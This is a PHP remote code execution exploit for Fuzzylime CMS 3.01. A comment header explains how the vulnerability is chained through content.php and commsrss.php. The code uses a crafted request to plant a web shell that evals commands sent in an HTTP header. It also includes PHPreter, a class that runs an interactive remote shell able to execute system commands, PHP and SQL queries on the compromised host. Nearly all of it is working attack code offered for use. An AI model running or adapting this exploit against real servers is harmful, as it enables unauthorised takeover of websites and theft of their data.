&lt;?php
##
## Name:       Fuzzylime 3.01 Remote Code Execution Exploit
## Credits:    Charles &quot;real&quot; F. &lt;charlesfol[at]hotmail.fr&gt;
##
## Conditions: None
##
## Greetz:     Inphex, hEEGy and austeN
##
## Explanations
## ************
##
## Ok, so today we will go for a walk in the fuzzylime cms maze ...
## Finding vulns was easy, but finding a no condition vuln was quite
## harder ...
##
## First, we look to the code/content.php file:
##
##---[code/content.php]------------------------------------------
## 02| require_once(&quot;code/functions.php&quot;);
## --| [...]
## 09| $countfile = &quot;code/counter/${s}_$p.inc.php&quot;;
## 10| if(file_exists($countfile)) {
## 11|     $curcount = loadfile($countfile);
## 12| }
## 13| $curcount++;
## 14| if($handle = @fopen($countfile, &#039;w&#039;)) { // Open the file for saving
## 15|     fputs($handle, $curcount);
## 16|     fclose($handle);
## 17| }
##----------------------------------------------------------------
##
## $s, $p, $curcount vars are not initialized, so we can set it if
## register_globals=On.
##
## POC: http://[url]/code/content.php?s=owned&amp;p=owned&amp;curcount=[PHP_SCRIPT]
##
## Note: [C:\]# php -r &quot;$var=&#039;abc&#039;; $var++; print $var;&quot;
##       abd
## So the ++ just increment the last string letter position in the alphabet
## a-&gt;b, b-&gt;c, etc.
##
## Ok, we got remote code exec ... but wait a minute ... no ! require_once()
## requires a file in the code folder, but we are already in this folder ...
## PHP will die (Fatal Error) and our evil code won&#039;t be executed.
## And we wanted a no condition exploit, but this vuln needs register_globals
## to be On ...
##
## hum... let&#039;s look at other pages: we can find that extract() function is
## pretty often used, and it can simulate register_globals ...
## Now we are looking for a file which uses extract() and which can include
## code/content.php file, and which is in the root path.
##
## And we finally found commsrss.php, which contains:
##
##---[commsrss.php]-----------------------------------------------
## 17| extract($HTTP_POST_VARS); 
## 18| extract($_POST);
## 19| extract($HTTP_GET_VARS); 
## 20| extract($_GET);
## 21| extract($HTTP_COOKIE_VARS); 
## 22| extract($_COOKIE);
## --| [...]
## 64| $dir = &quot;blogs/comments/&quot;;
## 65| if($dlist = opendir($dir)) {
## 66|     while (($file = readdir($dlist)) !== false) {
## 67|         if(strstr($file, $p)) {
## 68|             $files[] = $file;
## 69|         }
## 70|     }
## 71|     closedir($dlist);
## 72| }
## 73| for($i = 0; $i &lt; count($files); $i++) {
## 74|     include &quot;blogs/comments/$files[$i]&quot;;
## --| [...]
## 89| }
##----------------------------------------------------------------
##
## w00t ! $files array is not initialized ... we can include every
## file we want.
##
## Using chr() we can bypass magic_quotes_gpc=Off [ see chrit() ]
##
## Our problems are solved, we have a Remote Code Execution without
## conditions.
##
## Proof of Concept
## ****************
##
## [C:\]# php exploit.php http://www.target.com/
## [target][cmd]# ls
## blogs_.inc.php
## content_index.inc.php
## content_index.php.inc.php
## content_test.inc.php
## front_index.inc.php
## front_test.inc.php
## index.htm
## index.php_index.inc.php
##
## [target][cmd]# exit
##
## [C:\]# 

$url = $argv[1];


$php_code = &#039;&lt;?php&#039;
          . &#039;error_reporting(0);&#039;
          . &#039;print &#039; . chrit(&#039;-:-:-&#039;) . &#039;;&#039;.
          . &#039;eval(stripslashes($_SERVER[HTTP_SHELL]));&#039;
	  . &#039;print &#039; . chrit(&#039;-:-:-&#039;) . &#039;;&#039;.
	  . &#039;?&gt;&#039;;

$php_code--; // 13| $curcount++;

$c0de  = $url . &#039;commsrss.php?s=blogs&amp;m=&amp;usecache=0&amp;files[0]=../../code/content.php&#039;
              . &#039;&amp;curcount=&#039; . urlencode($php_code);

$shell = $url . &#039;code/counter/blogs_.inc.php&#039;;


# Be careful: we can create a valid shell only ONCE.
# So check if it does not already exist before doing
# anything else.
if(status_404($shell)==true)
	get($c0de);

$phpR = new phpreter($shell, &#039;-:-:-(.*)-:-:-&#039;, &#039;cmd&#039;, array(), false);

function chrit($str)
{
	$r = &#039;&#039;;
	
	for($i=0;$i&lt;strlen($str);$i++)
	{
		$z  = substr($str, $i, 1);
		$r .= &#039;.chr(&#039;.ord($z).&#039;)&#039;;
	}
	
	return substr($r, 1);
}

function get($url)
{
	$infos = parse_url($url);
	$host  = $infos[&#039;host&#039;];
	$port  = isset($infos[&#039;port&#039;]) ? $infos[&#039;port&#039;] : 80;
	
	$fp = fsockopen($host, $port, &amp;$errno, &amp;$errstr, 30);
	
	$req  = &quot;GET $url HTTP/1.1\r\n&quot;;
	$req .= &quot;Host: $host\r\n&quot;;
	$req .= &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14\r\n&quot;;
	$req .= &quot;Connection: close\r\n\r\n&quot;;

	fputs($fp,$req);
	fclose($fp);
}

function status_404($url)
{
	$infos = parse_url($url);
	$host  = $infos[&#039;host&#039;];
	$port  = isset($infos[&#039;port&#039;]) ? $infos[&#039;port&#039;] : 80;
	
	$fp = fsockopen($host, $port, &amp;$errno, &amp;$errstr, 30);
	
	$req  = &quot;GET $url HTTP/1.1\r\n&quot;;
	$req .= &quot;Host: $host\r\n&quot;;
	$req .= &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14\r\n&quot;;
	$req .= &quot;Connection: close\r\n\r\n&quot;;

	fputs($fp, $req);
	
	$res = &#039;&#039;;
	while(!feof($fp) &amp;&amp; !preg_match(&#039;#404#&#039;, $res))
		$res .= fgets($fp, 1337);
	
	fclose($fp);
	
	if(preg_match(&#039;#404#&#039;, $res))
		return true;
	
	return false;
}

/*
 * Copyright (c) real
 *
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 *
 * TITLE:          PHPreter
 * AUTHOR:         Charles &quot;real&quot; F. &lt;charlesfol[at]hotmail.fr&gt;
 * VERSION:        1.0
 * LICENSE:        GNU General Public License
 *
 * This is a really simple class with permits to exec SQL, PHP or CMD
 * on a remote host using the HTTP &quot;Shell&quot; header.
 *
 *
 * Sample code:
 * [host][sql]# mode=cmd
 * [host][cmd]# id
 * uid=2176(u47170584) gid=600(ftpusers)
 * 
 * [host][cmd]# mode=php
 * [host][php]# echo phpversion();
 * 4.4.8
 * [host][php]# mode=sql
 * [host][sql]# SELECT version(), user()
 * --------------------------------------------------
 *  version()           | 5.0.51a-log
 *  user()              | dbo225004932@74.208.16.148
 * --------------------------------------------------
 * 
 * [host][sql]#
 *
 */

class phpreter
{
	var $url;
	var $host;
	var $port;
	var $page;
	
	var $mode;
	
	var $ssql;
	
	var $prompt;
	var $phost;
	
	var $regex;
	var $data;
	
	/**
	 * __construct()
	 *
	 * @param url      The url of the remote shell.
	 * @param regexp   The regex to catch cmd result.
	 * @param mode     Mode: php, sql or cmd.
	 * @param sql      An array with the file to include,
	 *                 and sql vars
	 * @param clear    Determines if clear() is called
	 *                 on startup
	 */
	function __construct($url, $regexp=&#039;^(.*)$&#039;, $mode=&#039;cmd&#039;, $sql=array(), $clear=true)
	{
		$this-&gt;url = $url;
		
		$this-&gt;regex = &#039;#&#039;.$regexp.&#039;#is&#039;;
		
		#
		# Set data
		#
		
		$infos         =	parse_url($this-&gt;url);
		$this-&gt;host    =	$infos[&#039;host&#039;];
		$this-&gt;port    =	isset($infos[&#039;port&#039;]) ? $infos[&#039;port&#039;] : 80;
		$this-&gt;page    =	$infos[&#039;path&#039;];
		unset($infos);
		
		# www.(site).com
		$host_tmp      =	explode(&#039;.&#039;,$this-&gt;host);
		$this-&gt;phost   =	$host_tmp[ count($host_tmp)-2 ];
		unset($host_tmp);
		
		#
		# Set up MySQL connection string
		#
		if(!sizeof($sql))
			$this-&gt;ssql = &#039;&#039;;
		elseif(sizeof($sql)==5)
		{
			$this-&gt;ssql = &quot;include(&#039;$sql[0]&#039;);&quot;
			            . &quot;mysql_connect($sql[1], $sql[2], $sql[3]);&quot;
				    . &quot;mysql_select_db($sql[4]);&quot;;
		}
		else
		{
			$this-&gt;ssql = &quot;&quot;
			            . &quot;mysql_connect(&#039;$sql[0]&#039;, &#039;$sql[1]&#039;, &#039;$sql[2]&#039;);&quot;
				    . &quot;mysql_select_db(&#039;$sql[3]&#039;);&quot;;
		}
		
		$this-&gt;setmode($mode);
		
		#
		# Main Loop
		#

		if($clear) $this-&gt;clear();
		print $this-&gt;prompt;

		while( !preg_match(&#039;#^(quit|exit|close)$#i&#039;, ($cmd = trim(fgets(STDIN)))) )
		{
			# change mode
			if(preg_match(&#039;#^(set )?mode(=| )(sql|cmd|php)$#i&#039;,$cmd,$array))
				$this-&gt;setmode($array[3]);
			
			# clear data
			elseif(preg_match(&#039;#^clear$#i&#039;,$cmd))
				$this-&gt;clear();
			
			# else
			else print $this-&gt;exec($cmd);
			
			print $this-&gt;prompt;
		}
	}
	
	/**
	 * clear()
	 * Just clears ouput, printing &#039;\n&#039;x50
	 */
	function clear()
	{
		print str_repeat(&quot;\n&quot;, 50);
		return 0;
	}
	
	/**
	 * setmode()
	 * Set mode (PHP, CMD, SQL)
	 * You don&#039;t have to call it.
	 * use mode=[php|cmd|sql] instead,
	 * in the prompt.
	 */
	function setmode($newmode)
	{
		$this-&gt;mode = strtolower($newmode);
		$this-&gt;prompt = &#039;[&#039;.$this-&gt;phost.&#039;][&#039;.$this-&gt;mode.&#039;]# &#039;;
		
		switch($this-&gt;mode)
		{
			case &#039;cmd&#039;:
				$this-&gt;data = &#039;system(\&#039;&lt;CMD&gt;\&#039;);&#039;;
				break;
			case &#039;php&#039;:
				$this-&gt;data = &#039;&#039;;
				break;
			case &#039;sql&#039;:
				$this-&gt;data = $this-&gt;ssql
				            . &#039;$q = mysql_query(\&#039;&lt;CMD&gt;\&#039;) or print(str_repeat(&quot;-&quot;,50).&quot;\n&quot;.mysql_error().&quot;\n&quot;);&#039;
					    . &#039;print str_repeat(&quot;-&quot;,50).&quot;\n&quot;;&#039;
					    . &#039;while($r=mysql_fetch_array($q,MYSQL_ASSOC))&#039;
					    . &#039;{&#039;
					    . 	&#039;foreach($r as $k=&gt;$v) print &quot; &quot;.$k.str_repeat(&quot; &quot;, (20-strlen($k))).&quot;| $v\n&quot;;&#039;
					    . 	&#039;print str_repeat(&quot;-&quot;,50).&quot;\n&quot;;&#039;
					    . &#039;}&#039;;
				break;
		}
		return $this-&gt;mode;
	}

	/**
	 * exec()
	 * Execute any query and catch the result.
	 * You don&#039;t have to call it.
	 */
	function exec($cmd)
	{
		if(!strlen($this-&gt;data))	$shell = $cmd;
		else                    	$shell = str_replace(&#039;&lt;CMD&gt;&#039;, addslashes($cmd), $this-&gt;data);
		
		$fp = fsockopen($this-&gt;host, $this-&gt;port, &amp;$errno, &amp;$errstr, 30);
		
		$req  = &quot;GET &quot; . $this-&gt;page . &quot; HTTP/1.1\r\n&quot;;
		$req .= &quot;Host: &quot; . $this-&gt;host . ( $this-&gt;port!=80 ? &#039;:&#039;.$this-&gt;port : &#039;&#039; ) . &quot;\r\n&quot;;
		$req .= &quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14\r\n&quot;;
		$req .= &quot;Shell: $shell\r\n&quot;;
		$req .= &quot;Connection: close\r\n\r\n&quot;;
		
		unset($shell);

		fputs($fp, $req);
		
		$content = &#039;&#039;;
		while(!feof($fp)) $content .= fgets($fp, 128);
		
		fclose($fp);
		
		# Remove headers
		$data    = explode(&quot;\r\n\r\n&quot;, $content);
		$headers = array_shift($data);
		$content = implode(&quot;\r\n\r\n&quot;, $data);
		
		if(preg_match(&quot;#Transfer-Encoding:.*chunked#i&quot;, $headers))
			$content = $this-&gt;unchunk($content);
	
		preg_match($this-&gt;regex, $content, $data);
		
		if($data[1][ strlen($data)-1 ] != &quot;\n&quot;) $data[1] .= &quot;\n&quot;;
		
		return $data[1];
	}
	
	/**
	 * unchunk()
	 * This function aims to remove chunked content sizes which
	 * are putted by apache server when it uses chunked
	 * transfert-encoding.
	 */
	function unchunk($data)
	{
		$dsize  = 1;
		$offset = 0;
		
		while($dsize&gt;0)
		{
			$hsize_size = strpos($data, &quot;\r\n&quot;, $offset) - $offset;
			
			$dsize = hexdec(substr($data, $offset, $hsize_size));
			
			# Remove $hsize\r\n from $data
			$data = substr($data, 0, $offset) . substr($data, ($offset + $hsize_size + 2) );
			
			$offset += $dsize;
			
			# Remove the \r\n before the next $hsize
			$data = substr($data, 0, $offset) . substr($data, ($offset+2) );
		}
		
		return $data;
	}
}

?&gt;

